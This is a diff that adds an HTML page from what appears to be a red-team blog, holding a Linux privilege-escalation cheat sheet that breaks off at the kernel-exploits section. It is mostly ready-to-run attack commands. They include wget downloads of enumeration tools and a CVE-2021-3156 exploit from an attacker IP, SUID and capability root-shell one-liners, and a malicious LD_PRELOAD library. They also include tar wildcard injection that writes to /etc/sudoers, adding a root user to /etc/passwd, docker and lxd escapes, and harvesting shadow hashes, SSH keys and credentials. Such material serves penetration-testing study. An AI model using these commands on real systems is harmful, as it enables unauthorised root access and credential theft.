@@ -1,0 +1,361 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Linux-Privilege-Escalation"><a href="#Linux-Privilege-Escalation" class="headerlink" title="Linux Privilege Escalation"></a>Linux Privilege Escalation</h1><p>Escalate privileges on Linux systems through misconfigurations, SUID binaries, sudo abuse, kernel exploits, and weak file permissions.<br>This phase follows initial access and aims to gain root-level access for complete system compromise.</p>
+<h2 id="Quick-Enumeration-Commands"><a href="#Quick-Enumeration-Commands" class="headerlink" title="Quick Enumeration Commands"></a>Quick Enumeration Commands</h2><h3 id="Foothold-Commands-Run-First"><a href="#Foothold-Commands-Run-First" class="headerlink" title="Foothold Commands (Run First)"></a>Foothold Commands (Run First)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">hostname</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">env</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">ip a</span><br><span class="line"><span class="built_in">cat</span> /etc/hosts</span><br><span class="line"><span class="built_in">cat</span> /etc/os-release</span><br><span class="line">ps aux --<span class="built_in">sort</span>=-%cpu | <span class="built_in">head</span> -n 20</span><br><span class="line">w</span><br><span class="line">lastlog</span><br></pre></td></tr></table></figure>
+
+<h3 id="System-Information"><a href="#System-Information" class="headerlink" title="System Information"></a>System Information</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># OS and kernel version</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="built_in">cat</span> /etc/os-release</span><br><span class="line">lsb_release -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># CPU information</span></span><br><span class="line">lscpu</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mounted drives and file systems</span></span><br><span class="line">lsblk</span><br><span class="line"><span class="built_in">df</span> -h</span><br><span class="line"><span class="built_in">cat</span> /etc/fstab</span><br><span class="line">mount</span><br><span class="line"></span><br><span class="line"><span class="comment"># Network configuration</span></span><br><span class="line">ip a</span><br><span class="line">route -n</span><br><span class="line">arp -a</span><br><span class="line"><span class="built_in">cat</span> /etc/resolv.conf</span><br><span class="line">ss -tulpen</span><br><span class="line">netstat -tulpen</span><br></pre></td></tr></table></figure>
+
+<h2 id="Automated-Enumeration-Tools"><a href="#Automated-Enumeration-Tools" class="headerlink" title="Automated Enumeration Tools"></a>Automated Enumeration Tools</h2><h3 id="LinPEAS"><a href="#LinPEAS" class="headerlink" title="LinPEAS"></a>LinPEAS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Download and run</span></span><br><span class="line">wget http://10.10.14.5/linpeas.sh</span><br><span class="line"><span class="built_in">chmod</span> +x linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="LinEnum"><a href="#LinEnum" class="headerlink" title="LinEnum"></a>LinEnum</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.5/LinEnum.sh</span><br><span class="line"><span class="built_in">chmod</span> +x LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux-Smart-Enumeration-LSE"><a href="#Linux-Smart-Enumeration-LSE" class="headerlink" title="Linux Smart Enumeration (LSE)"></a>Linux Smart Enumeration (LSE)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.5/lse.sh</span><br><span class="line"><span class="built_in">chmod</span> +x lse.sh</span><br><span class="line">./lse.sh -l 1  <span class="comment"># Level 1 (basic)</span></span><br><span class="line">./lse.sh -l 2  <span class="comment"># Level 2 (detailed)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="pspy-Process-Monitoring"><a href="#pspy-Process-Monitoring" class="headerlink" title="pspy (Process Monitoring)"></a>pspy (Process Monitoring)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Monitor processes without root</span></span><br><span class="line">wget http://10.10.14.5/pspy64</span><br><span class="line"><span class="built_in">chmod</span> +x pspy64</span><br><span class="line">./pspy64 -pf -i 1000</span><br></pre></td></tr></table></figure>
+
+<h2 id="Sudo-Abuse"><a href="#Sudo-Abuse" class="headerlink" title="Sudo Abuse"></a>Sudo Abuse</h2><h3 id="Check-Sudo-Permissions"><a href="#Check-Sudo-Permissions" class="headerlink" title="Check Sudo Permissions"></a>Check Sudo Permissions</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> -V  <span class="comment"># Check sudo version for CVEs</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Sudo-NOPASSWD-Exploitation"><a href="#Sudo-NOPASSWD-Exploitation" class="headerlink" title="Sudo NOPASSWD Exploitation"></a>Sudo NOPASSWD Exploitation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># If sudo -l shows NOPASSWD for a binary, check GTFOBins</span></span><br><span class="line"><span class="comment"># Example: sudo NOPASSWD: /usr/bin/find</span></span><br><span class="line"><span class="built_in">sudo</span> find . -<span class="built_in">exec</span> /bin/bash \; -quit</span><br></pre></td></tr></table></figure>
+
+<h3 id="Sudo-LD-PRELOAD"><a href="#Sudo-LD-PRELOAD" class="headerlink" title="Sudo LD_PRELOAD"></a>Sudo LD_PRELOAD</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># If sudo -l shows: env_keep+=LD_PRELOAD</span></span><br><span class="line"><span class="comment"># Create malicious shared library</span></span><br><span class="line"><span class="built_in">cat</span> &gt; shell.c &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">void _init() &#123;</span></span><br><span class="line"><span class="string">    unsetenv(&quot;LD_PRELOAD&quot;);</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    system(&quot;/bin/bash -p&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c</span><br><span class="line"><span class="built_in">sudo</span> LD_PRELOAD=/tmp/shell.so &lt;any_sudo_binary&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Sudo-Vulnerabilities"><a href="#Sudo-Vulnerabilities" class="headerlink" title="Sudo Vulnerabilities"></a>Sudo Vulnerabilities</h3><h4 id="CVE-2021-3156-Baron-Samedit"><a href="#CVE-2021-3156-Baron-Samedit" class="headerlink" title="CVE-2021-3156 (Baron Samedit)"></a>CVE-2021-3156 (Baron Samedit)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Affects sudo versions &lt; 1.9.5p2</span></span><br><span class="line"><span class="comment"># Check version</span></span><br><span class="line"><span class="built_in">sudo</span> -V</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit</span></span><br><span class="line">wget http://10.10.14.5/CVE-2021-3156.sh</span><br><span class="line"><span class="built_in">chmod</span> +x CVE-2021-3156.sh</span><br><span class="line">./CVE-2021-3156.sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="SUID-SGID-Binaries"><a href="#SUID-SGID-Binaries" class="headerlink" title="SUID &#x2F; SGID Binaries"></a>SUID &#x2F; SGID Binaries</h2><h3 id="Find-SUID-Binaries"><a href="#Find-SUID-Binaries" class="headerlink" title="Find SUID Binaries"></a>Find SUID Binaries</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Find SUID files</span></span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find SGID files</span></span><br><span class="line">find / -perm -2000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -6000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h3 id="GTFOBins-Exploitation"><a href="#GTFOBins-Exploitation" class="headerlink" title="GTFOBins Exploitation"></a>GTFOBins Exploitation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check found SUID binaries against GTFOBins</span></span><br><span class="line"><span class="comment"># https://gtfobins.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example: find with SUID</span></span><br><span class="line">find . -<span class="built_in">exec</span> /bin/bash -p \; -quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example: vim with SUID</span></span><br><span class="line">vim -c <span class="string">&#x27;:py3 import os; os.setuid(0); os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example: python with SUID</span></span><br><span class="line">python -c <span class="string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash -p&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example: perl with SUID</span></span><br><span class="line">perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Match-Installed-Packages-with-GTFOBins"><a href="#Match-Installed-Packages-with-GTFOBins" class="headerlink" title="Match Installed Packages with GTFOBins"></a>Match Installed Packages with GTFOBins</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># List installed packages</span></span><br><span class="line">apt list --installed | <span class="built_in">tr</span> <span class="string">&quot;/&quot;</span> <span class="string">&quot; &quot;</span> | <span class="built_in">cut</span> -d<span class="string">&quot; &quot;</span> -f1,3 | sed <span class="string">&#x27;s/[0-9]://g&#x27;</span> &gt; installed_pkgs.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check against GTFOBins</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(curl -s https://gtfobins.github.io/ | html2text | <span class="built_in">cut</span> -d<span class="string">&quot; &quot;</span> -f1 | sed <span class="string">&#x27;/^[[:space:]]*$/d&#x27;</span>); <span class="keyword">do</span> </span><br><span class="line">    <span class="keyword">if</span> grep -q <span class="string">&quot;<span class="variable">$i</span>&quot;</span> installed_pkgs.list; <span class="keyword">then</span> </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Check GTFO for: <span class="variable">$i</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux-Capabilities"><a href="#Linux-Capabilities" class="headerlink" title="Linux Capabilities"></a>Linux Capabilities</h2><h3 id="Find-Capabilities"><a href="#Find-Capabilities" class="headerlink" title="Find Capabilities"></a>Find Capabilities</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Find all capabilities</span></span><br><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># Common dangerous capabilities</span></span><br><span class="line"><span class="comment"># cap_setuid - allows changing UID</span></span><br><span class="line"><span class="comment"># cap_dac_override - bypass file permissions</span></span><br><span class="line"><span class="comment"># cap_sys_admin - various admin operations</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Exploit-Capabilities"><a href="#Exploit-Capabilities" class="headerlink" title="Exploit Capabilities"></a>Exploit Capabilities</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Example: python with cap_setuid</span></span><br><span class="line">/usr/bin/python3 -c <span class="string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example: perl with cap_setuid</span></span><br><span class="line">/usr/bin/perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example: tar with cap_dac_override</span></span><br><span class="line">tar -cvf /dev/null /etc/shadow --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h2 id="Privileged-Groups"><a href="#Privileged-Groups" class="headerlink" title="Privileged Groups"></a>Privileged Groups</h2><h3 id="Docker-Group"><a href="#Docker-Group" class="headerlink" title="Docker Group"></a>Docker Group</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check if user is in docker group</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># List docker images</span></span><br><span class="line">docker image list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mount host root filesystem</span></span><br><span class="line">docker run -v /:/mnt --<span class="built_in">rm</span> -it ubuntu <span class="built_in">chroot</span> /mnt bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternative method</span></span><br><span class="line">docker -H unix:///var/run/docker.sock run -v /:/mnt --<span class="built_in">rm</span> -it ubuntu <span class="built_in">chroot</span> /mnt bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="LXD-Group"><a href="#LXD-Group" class="headerlink" title="LXD Group"></a>LXD Group</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check if user is in lxd group</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Build Alpine image on attacker machine</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line"></span><br><span class="line"><span class="comment"># Transfer to target and import</span></span><br><span class="line">lxc image import ./alpine*.tar.gz --<span class="built_in">alias</span> myimage</span><br><span class="line">lxc image list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create privileged container</span></span><br><span class="line">lxc init myimage ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Access host filesystem</span></span><br><span class="line"><span class="built_in">cd</span> /mnt/root</span><br></pre></td></tr></table></figure>
+
+<h3 id="ADM-Group"><a href="#ADM-Group" class="headerlink" title="ADM Group"></a>ADM Group</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ADM group can read log files</span></span><br><span class="line"><span class="comment"># Search logs for credentials</span></span><br><span class="line">grep -r <span class="string">&quot;password&quot;</span> /var/log 2&gt;/dev/null</span><br><span class="line">grep -r <span class="string">&quot;pass&quot;</span> /var/log 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h3 id="Disk-Group"><a href="#Disk-Group" class="headerlink" title="Disk Group"></a>Disk Group</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Disk group has raw access to block devices</span></span><br><span class="line"><span class="comment"># Read entire disk</span></span><br><span class="line">debugfs /dev/sda1</span><br><span class="line">debugfs: <span class="built_in">cat</span> /etc/shadow</span><br><span class="line">debugfs: <span class="built_in">cat</span> /root/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<h2 id="Scheduled-Tasks-Cron"><a href="#Scheduled-Tasks-Cron" class="headerlink" title="Scheduled Tasks (Cron)"></a>Scheduled Tasks (Cron)</h2><h3 id="Enumerate-Cron-Jobs"><a href="#Enumerate-Cron-Jobs" class="headerlink" title="Enumerate Cron Jobs"></a>Enumerate Cron Jobs</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check user crontab</span></span><br><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check system crontabs</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="built_in">ls</span> -la /etc/cron.*</span><br><span class="line"><span class="built_in">cat</span> /etc/cron.d/*</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check all user crontabs</span></span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> $(<span class="built_in">cut</span> -f1 -d: /etc/passwd); <span class="keyword">do</span> </span><br><span class="line">    crontab -u <span class="variable">$user</span> -l 2&gt;/dev/null</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check systemd timers</span></span><br><span class="line">systemctl list-timers --all</span><br></pre></td></tr></table></figure>
+
+<h3 id="Find-Writable-Cron-Scripts"><a href="#Find-Writable-Cron-Scripts" class="headerlink" title="Find Writable Cron Scripts"></a>Find Writable Cron Scripts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Find world-writable files</span></span><br><span class="line">find / -path /proc -prune -o -<span class="built_in">type</span> f -perm -o+w 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check permissions on cron scripts</span></span><br><span class="line"><span class="built_in">ls</span> -la /etc/cron.daily/</span><br><span class="line"><span class="built_in">ls</span> -la /etc/cron.hourly/</span><br></pre></td></tr></table></figure>
+
+<h3 id="Tar-Wildcard-Exploitation"><a href="#Tar-Wildcard-Exploitation" class="headerlink" title="Tar Wildcard Exploitation"></a>Tar Wildcard Exploitation</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># If cron job uses: tar -zcf backup.tar.gz *</span></span><br><span class="line"><span class="comment"># Create malicious files</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;echo &quot;user ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; root.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; <span class="string">&quot;--checkpoint-action=exec=sh root.sh&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; --checkpoint=1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wait for cron to run, then check sudo</span></span><br><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
+
+<h2 id="Weak-File-Permissions"><a href="#Weak-File-Permissions" class="headerlink" title="Weak File Permissions"></a>Weak File Permissions</h2><h3 id="Writable-etc-passwd"><a href="#Writable-etc-passwd" class="headerlink" title="Writable &#x2F;etc&#x2F;passwd"></a>Writable &#x2F;etc&#x2F;passwd</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check if /etc/passwd is writable</span></span><br><span class="line"><span class="built_in">ls</span> -la /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate password hash</span></span><br><span class="line">openssl passwd -1 -salt salt password123</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add new root user</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;newroot:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Or remove password for existing user</span></span><br><span class="line"><span class="comment"># Change: root:x:0:0:root:/root:/bin/bash</span></span><br><span class="line"><span class="comment"># To: root::0:0:root:/root:/bin/bash</span></span><br><span class="line">su root  <span class="comment"># No password required</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Readable-etc-shadow"><a href="#Readable-etc-shadow" class="headerlink" title="Readable &#x2F;etc&#x2F;shadow"></a>Readable &#x2F;etc&#x2F;shadow</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check if shadow is readable</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy hashes and crack offline</span></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt</span><br><span class="line">hashcat -m 1800 shadow.txt rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="Writable-etc-shadow"><a href="#Writable-etc-shadow" class="headerlink" title="Writable &#x2F;etc&#x2F;shadow"></a>Writable &#x2F;etc&#x2F;shadow</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Generate new password hash</span></span><br><span class="line">mkpasswd -m sha-512 password123</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace root hash in /etc/shadow</span></span><br><span class="line"><span class="comment"># Or remove hash entirely for passwordless login</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="SSH-Keys"><a href="#SSH-Keys" class="headerlink" title="SSH Keys"></a>SSH Keys</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Find SSH private keys</span></span><br><span class="line">find / -name <span class="string">&quot;id_rsa&quot;</span> -o -name <span class="string">&quot;id_dsa&quot;</span> -o -name <span class="string">&quot;*.pem&quot;</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check permissions</span></span><br><span class="line"><span class="built_in">ls</span> -la ~/.ssh/</span><br><span class="line"><span class="built_in">ls</span> -la /home/*/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># If /root/.ssh is writable, add your public key</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAA...&quot;</span> &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line">ssh root@target</span><br></pre></td></tr></table></figure>
+
+<h2 id="Credential-Hunting"><a href="#Credential-Hunting" class="headerlink" title="Credential Hunting"></a>Credential Hunting</h2><h3 id="Search-for-Passwords-in-Files"><a href="#Search-for-Passwords-in-Files" class="headerlink" title="Search for Passwords in Files"></a>Search for Passwords in Files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Search for password patterns</span></span><br><span class="line">grep -R --line-number -i <span class="string">&quot;pass\|pwd\|secret\|token&quot;</span> /etc /home 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># Search in config files</span></span><br><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&quot;*.conf&quot;</span> -<span class="built_in">exec</span> grep -H <span class="string">&quot;pass&quot;</span> &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&quot;*.config&quot;</span> -<span class="built_in">exec</span> grep -H <span class="string">&quot;pass&quot;</span> &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># Search in scripts</span></span><br><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&quot;*.sh&quot;</span> -<span class="built_in">exec</span> grep -H <span class="string">&quot;pass&quot;</span> &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># Search for backup files</span></span><br><span class="line">find / -<span class="built_in">type</span> f \( -name <span class="string">&quot;*.bak&quot;</span> -o -name <span class="string">&quot;*.backup&quot;</span> -o -name <span class="string">&quot;*.old&quot;</span> \) 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h3 id="History-Files"><a href="#History-Files" class="headerlink" title="History Files"></a>History Files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Find history files</span></span><br><span class="line">find / -<span class="built_in">type</span> f \( -name <span class="string">&quot;*_history&quot;</span> -o -name <span class="string">&quot;.bash_history&quot;</span> -o -name <span class="string">&quot;.zsh_history&quot;</span> \) 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read history files</span></span><br><span class="line"><span class="built_in">cat</span> ~/.bash_history</span><br><span class="line"><span class="built_in">cat</span> ~/.mysql_history</span><br><span class="line"><span class="built_in">cat</span> ~/.python_history</span><br></pre></td></tr></table></figure>
+
+<h3 id="Environment-Variables"><a href="#Environment-Variables" class="headerlink" title="Environment Variables"></a>Environment Variables</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check environment for secrets</span></span><br><span class="line"><span class="built_in">env</span> | <span class="built_in">sort</span></span><br><span class="line"><span class="built_in">printenv</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Database-Credentials"><a href="#Database-Credentials" class="headerlink" title="Database Credentials"></a>Database Credentials</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Common database config locations</span></span><br><span class="line"><span class="built_in">cat</span> /var/www/html/config.php</span><br><span class="line"><span class="built_in">cat</span> /var/www/html/wp-config.php</span><br><span class="line"><span class="built_in">cat</span> /etc/mysql/my.cnf</span><br><span class="line"><span class="built_in">cat</span> ~/.my.cnf</span><br></pre></td></tr></table></figure>
+
+<h2 id="Kernel-Exploits"><a href="#Kernel-Exploits" class="headerlink" title="Kernel Exploits"></a>Kernel Exploits</h2><h3 id="Check-Kernel-Version"><a href="#Check-Kernel-Version" class="headerlink" title="Check Kernel Version"></a>Check Kernel Version</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="built_in">cat</span> /proc/version</span><br></pre></td></tr></table></figure>
+
